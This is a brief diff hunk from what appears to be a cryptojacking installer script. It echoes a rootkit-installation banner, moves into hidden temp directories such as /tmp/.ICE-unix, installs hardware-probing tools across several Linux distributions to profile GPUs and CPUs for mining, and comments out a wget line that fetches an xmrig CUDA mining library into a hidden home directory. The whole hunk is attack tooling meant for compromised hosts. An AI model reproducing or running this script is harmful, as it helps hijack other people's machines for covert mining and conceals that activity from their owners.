@@ -427,7 +427,7 @@ echo "[*] #Installing r00tkit(z)"
 
 echo "[*] Determining GPU+CPU (without lshw)"
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils -y; apt-get install pciutils -y --force-yes ; update-pciids ; lspci -vs 00:01.0 ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
-cd $HOME/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
+#cd $HOME/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
 
 echo "[*] Determining GPU+CPU"
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install msr-tools pciutils lshw -y; apt-get install msr-tools pciutils lshw -y --force-yes ; zypper install msrtools pciutils lshw -y ; update-pciids ; lspci -vs 00:01.0 ; lshw -C display ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
